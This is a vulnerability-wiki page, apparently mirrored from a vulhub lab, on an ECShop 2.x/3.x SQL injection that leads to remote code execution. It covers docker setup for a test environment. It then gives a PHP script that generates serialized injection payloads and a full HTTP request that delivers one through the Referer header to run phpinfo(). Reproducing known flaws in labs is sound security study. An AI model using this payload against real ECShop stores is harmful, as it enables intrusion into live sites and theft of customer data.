<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ECShop/xianzhi-2017-02-82239600/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability", url: "#_top", children: [
              {title: "Environment setup", url: "#environment-setup" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        ECShop 2.x/3.x SQL注入/任意代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../collection_list-sqli/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../collection_list-sqli/README.zh-cn/" class="btn btn-xs btn-link">
        ECShop 4.x Collection List SQL注入漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="ecshop-2x3x-sql-injection-remote-code-execution-vulnerability">ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability<a class="headerlink" href="#ecshop-2x3x-sql-injection-remote-code-execution-vulnerability" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>ECShop is a B2C independent shop system for companies and individuals to quickly build personalized online store. This system is a cross-platform open source program based on PHP language and MYSQL database architecture.</p>
<p>In 2017 and previous versions, there was a SQL injection vulnerability that could inject payload and eventually lead to code execution vulnerabilities. The latest version of 3.6.0 has fixed the vulnerability, and vulhub uses its latest version 2.7.3 and 3.6.0 non-latest version versions to reproduce the vulnerability.</p>
<p>Reference link:</p>
<ul>
<li><a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></li>
</ul>
<h2 id="environment-setup">Environment setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Run the following commands to start environment</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the environment start, visit <code>http://your-ip:8080</code>, you will see the 2.7.3 installation page. Visit <code>http://your-ip:8081</code>, you will see the 3.6.0 installation page.</p>
<p>Install both of them, mysql address is <code>mysql</code>, mysql account and password are <code>root</code>, the database name is free to fill in, but the database names of 2.7.3 and 3.6.0 can not be the same.</p>
<p>As the picture shows:</p>
<p><img alt="" src="0.png" /></p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>There is a script that can generate POC for 2.x and 3.x:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
<span class="nv">$shell</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="s2">&quot;{</span><span class="se">\$</span><span class="s2">asd&#39;];phpinfo</span><span class="se">\t</span><span class="s2">();//}xxx&quot;</span><span class="p">);</span>
<span class="nv">$id</span> <span class="o">=</span> <span class="s2">&quot;-1&#39; UNION/*&quot;</span><span class="p">;</span>
<span class="nv">$arr</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s2">&quot;num&quot;</span> <span class="o">=&gt;</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#39;</span><span class="p">,</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$id</span><span class="p">),</span> <span class="nv">$shell</span><span class="p">),</span>
    <span class="s2">&quot;id&quot;</span> <span class="o">=&gt;</span> <span class="nv">$id</span>
<span class="p">];</span>

<span class="nv">$s</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>

<span class="nv">$hash3</span> <span class="o">=</span> <span class="s1">&#39;45ea207d7a2b68c49582d2d22adf953a&#39;</span><span class="p">;</span>
<span class="nv">$hash2</span> <span class="o">=</span> <span class="s1">&#39;554fcae493e564ee0dc75bdf2ebf94ca&#39;</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">&quot;POC for ECShop 2.x: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;</span><span class="si">{</span><span class="nv">$hash2</span><span class="si">}</span><span class="s2">ads|</span><span class="si">{</span><span class="nv">$s</span><span class="si">}{</span><span class="nv">$hash2</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">POC for ECShop 3.x: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;</span><span class="si">{</span><span class="nv">$hash3</span><span class="si">}</span><span class="s2">ads|</span><span class="si">{</span><span class="nv">$s</span><span class="si">}{</span><span class="nv">$hash3</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
</code></pre></div>
<p>Put POC in the HTTP-Referer:</p>
<div class="highlight"><pre><span></span><code>GET /user.php?act=login HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#39; UNION/*&quot;;}45ea207d7a2b68c49582d2d22adf953a
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
</code></pre></div>
<p>Result of 2.x:</p>
<p><img alt="" src="1.png" /></p>
<p>Result of 3.x:</p>
<p><img alt="" src="2.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        ECShop 2.x/3.x SQL注入/任意代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../collection_list-sqli/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../collection_list-sqli/README.zh-cn/" class="btn btn-xs btn-link">
        ECShop 4.x Collection List SQL注入漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>